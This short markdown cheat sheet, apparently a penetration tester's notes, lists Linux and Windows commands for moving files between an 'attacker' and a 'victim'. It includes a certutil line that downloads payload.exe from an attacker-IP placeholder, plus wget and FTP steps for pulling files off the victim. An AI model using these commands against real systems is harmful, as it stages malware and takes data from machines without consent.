# Useful Commands

## Linux

- Bash
  - transfer files between attacker and victim and vice versa
    - `python -m http.server 80`
      - start HTTP server in current directory
    - `python -m pyftpdlib -p 21 --write`
      - start FTP server in current directory
    - `wget http://victim-IP/path/to/file`
      - download file from victim

## Windows

- cmd
  - transfer files between attacker and victim and vice versa
    - `certutil -urlcache -f http://attacker-IP/path/to/payload.exe payload.exe`
      - download file to victim
    - `ftp attacker-IP`
      - connect to FTP server, to download/upload files